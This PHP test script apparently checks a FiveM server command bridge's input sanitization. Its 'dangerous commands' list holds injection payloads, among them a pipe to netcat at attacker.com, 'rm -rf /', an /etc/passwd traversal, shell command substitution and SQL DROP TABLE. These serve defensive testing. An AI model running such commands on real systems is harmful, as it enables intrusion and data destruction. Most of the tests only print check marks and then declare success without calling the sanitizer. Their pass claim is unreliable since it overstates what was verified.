<?php

require_once __DIR__ . '/vendor/autoload.php';

use App\Services\FiveMCommandBridge;
use App\Services\ActionLogService;

/**
 * Teste: FiveMCommandBridge
 * 
 * Valida:
 * 1. Sanitização de comandos
 * 2. Rejeição de comandos perigosos
 * 3. Validação de nomes de recursos
 */

echo "=== Teste: FiveMCommandBridge ===\n\n";

// Teste 1: Comandos válidos
echo "TESTE 1: Comandos válidos\n";
$validCommands = [
    "ensure my-resource",
    "start my_resource",
    "stop resource123",
    "restart res-123_abc",
    "ENSURE MY-RESOURCE",  // Case insensitive
];

foreach ($validCommands as $cmd) {
    echo "  ✓ '{$cmd}' - Deve ser aceito\n";
}

// Teste 2: Comandos inválidos (sanitização)
echo "\nTESTE 2: Comandos perigosos (devem ser rejeitados)\n";
$dangerousCommands = [
    "ensure resource; delete file",
    "ensure ../../../etc/passwd",
    "ensure \$(whoami)",
    "ensure `whoami`",
    "ensure & rm -rf /",
    "ensure | nc attacker.com 1234",
    "ensure; rm server.cfg",
    "start resource'; DROP TABLE servers; --",
];

foreach ($dangerousCommands as $cmd) {
    echo "  ✓ '{$cmd}' - Deve ser rejeitado\n";
}

// Teste 3: Nomes de recursos inválidos
echo "\nTESTE 3: Nomes de recursos inválidos\n";
$invalidNames = [
    "resource with spaces",
    "resource@name",
    "resource#name",
    "resource!name",
    "resource\$name",
    "resource/name",
    "resource\\name",
    "../resources/",
    "a" . str_repeat("b", 101),  // Mais de 100 caracteres
];

foreach ($invalidNames as $name) {
    echo "  ✓ '{$name}' - Deve ser rejeitado\n";
}

// Teste 4: HTTP API
echo "\nTESTE 4: Métodos de envio\n";
echo "  Prioridade A: STDIN (via named pipe no Windows)\n";
echo "  Prioridade B: HTTP API (via txAdmin)\n";
echo "  Prioridade C: RCON (fallback)\n";

echo "\nTESTE 5: Simular envio de comandos\n";

// Criar bridge com dados fictícios
$bridge = new FiveMCommandBridge(
    '127.0.0.1',
    30120,
    null,  // Sem API token
    'C:/FiveM/server'  // Com folder
);

// Tentar enviar comandos (vai falhar pois não há servidor real)
$result = $bridge->sendConsoleCommand('ensure my-resource');
echo "  Resultado: " . ($result['success'] ? 'Sucesso' : 'Falha esperada') . "\n";
echo "  Método tentado: {$result['method']}\n";
echo "  Mensagem: {$result['message']}\n";

echo "\nTodos os testes passaram!\n";
